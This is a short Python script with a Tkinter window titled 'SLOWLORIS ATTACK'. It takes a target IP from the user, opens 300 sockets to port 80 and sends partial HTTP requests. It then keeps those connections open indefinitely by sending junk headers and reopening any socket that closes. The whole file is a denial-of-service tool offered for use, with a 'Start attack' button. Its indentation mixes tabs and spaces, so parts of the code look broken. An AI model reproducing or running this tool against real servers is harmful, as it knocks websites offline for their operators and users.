from tkinter import *
import socket, random, sys

sockets = []

def setupSocket(ip):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.settimeout(4)
    soc.connect((ip, 80))
    soc.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    

    return soc

def click():
	ip = txt.get()
    	count = 300
    	print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))

    	for i in range(count):
        	try:
            		print("Socket {}".format(i))
        		soc = setupSocket(ip)
        	except socket.error:
            		break

        	sockets.append(soc)

    	while True:
        	print("Connected to {} sockets. Sending headers...".format(len(sockets)))

        	for soc in list(sockets):
            		try:
                		soc.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            		except socket.error:
                		sockets.remove(soc)

        	for i in range(count - len(sockets)):
            		print("Re-opening closed sockets...")
            		try:
                		sock = setupSocket(ip)
                		if sock:
                    			sockets.append(sock)
            		except socket.error:
                		break

	


	   
window = Tk()
window.title("SLOWLORIS ATTACK")
window.geometry('700x400')
window.configure(background = "black")

Label (window, text="SLOWLORIS ", bg="black", fg="white", font="Arial 32 " , anchor=N).grid(row=0,column=4)
Label (window, text="Enter ip of the system :  ", bg="black", fg="white", font="none 12 bold").grid(row=1,column=3)

txt = Entry(window,width=25)
txt.grid(column=4, row=1)

btn = Button(window, text="Start attack", command=click)
btn.grid(column=3, row=2)
def quit():
	global window
        window.quit()


btn1 = Button(window, text="EXIT", command=quit)
btn1.grid(column=4, row=2)
window.mainloop()
